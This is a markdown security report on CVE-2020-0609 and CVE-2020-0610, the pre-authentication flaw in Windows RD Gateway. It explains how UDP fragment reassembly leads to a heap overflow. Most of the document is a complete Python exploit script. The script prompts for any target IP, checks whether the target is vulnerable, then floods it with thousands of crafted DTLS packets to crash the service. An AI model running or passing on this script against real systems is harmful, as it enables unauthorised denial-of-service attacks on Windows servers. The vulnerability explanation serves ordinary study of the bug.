
<div align="center"><h1>CVE-2020-0609 and CVE-2020-0610 REPORT</h1></div>

## About the vulnerability

A remote code execution vulnerability exists in Windows Remote Desktop Gateway (RD Gateway) when an unauthenticated attacker connects to the target system using RDP and sends specially crafted requests. This vulnerability is pre-authentication and requires no user interaction. An attacker who successfully exploited this vulnerability could execute arbitrary code on the target system.  
To exploit this vulnerability, an attacker would need to send a specially crafted request to the target systems RD Gateway via RDP.

**On versions:** Windows Server 2012, 2012 R2, 2016, 2019

## Explanation

The RDG UDP protocol splits the message into multiple packets to transport them. Since UDP is connectionless these packets can arrive in any order. The packets are reassembled at the recipient using the packet headers `fragment_id`, `num_fragments`, `fragment_length`. The function implemented to reassemble the packets has some bugs which lead to this vulnerability.

To summarize the packet reassembly algorithm used : we first allocate memory on the heap to act as a buffer and then divide this buffer into many sections of size (= `max_fragment_size`). Now whenever a packet arrives, we check if we have received that fragment before using its id, if we have not received that fragment before we copy its contents to the buffer. we copy the entirety of the fragment to the address (`&buffer + fragment_id * max_fragment_size`). Later when all packets have arrived we simply concatenate all the sections and end up with the actual message.

The problem arises because the size of all the sections required to hold all the packets may be much more than the actual size of the message and therefore the buffer. Thus we can write data on the heap outside the memory which was allocated for us, overwriting other important data this causes the process to run into errors and crash leading to a DoS.

Say the message length is 500, max fragment size is 1000
we can have two packets
```
packet (id=0) : length = 300
packet (id=1) : length = 200
assigned buffer size is 1000
packet 0 is written to the buffer at offset 0 (0 * max_fragment_size) and,
packet 1 is written to the buffer at offset 1000 (1 * max_fragment_size)
```
We can see that packet 1 is written beyond the memory assigned to the buffer and this leads to an overflow even though the buffer was big enough to hold the message.

## Exploit

```
import struct
import ssl
import sys
import signal
from socket import socket, AF_INET, SOCK_DGRAM
from dtls import do_patch, sslconnection

target = input("=> Target website/IP address : ")
port = int(input("=> Port number : "))

#Creating and wrapping SSL socket and establishing connection with target
def open_socket(target1, port1):
    socket1 = ssl.wrap_socket(socket(AF_INET, SOCK_DGRAM))
    setattr(socket1, "ssl_version", sslconnection.PROTOCOL_DTLSv1)
    socket1.connect((target1, port1))
    return socket1

#Creating packets for checking presence of vulnerability and also for DoS attack
def dos_packet(frag_no, frag_id):
    frag = "A" * 2000
    buffer1 = struct.pack("<HHHHH", 5, 2006, frag_id, frag_no, 2000)
    buffer1 += frag.encode()
    return buffer1

#Check if the server is vulnerable
do_patch()
socketA = open_socket(target, port)
packetA = dos_packet(100, 0)
socketA.write(packetA)
signal.signal(signal.SIGALRM, lambda signum, frame: None)
signal.alarm(5)
vuln = False

try:
    response = socketA.recv(16)[-4:]
    value = struct.unpack("<L", response)[0]
    vuln = value != 0x8000ffff
except:
    vuln = True
signal.alarm(0)
socketA.close()

#If vulnerable, Initiating DoS attack
if vuln:
    print("Target is vulnerable.\nInitiating DoS attack.")
    do_patch()
    for i in range(5000):
        socket1 = open_socket(target, port)
        for j in range(10):
            packet = dos_packet(i, i)
            socket1.write(packet)
        socket1.close()

else:
    print("Target not vulnerable.")
```
[Exploit on github](https://github.com/yash-bansod/Techmeet21-SAPTANG/blob/chall3/chall3/exploit_CVE-2020-0609.py)

This exploit was tested on Windows server 2019 and performs DOS on Windows server 2019.

## Proof of Concept

[PoC video](https://www.youtube.com/watch?v=0jWB87UaN10)
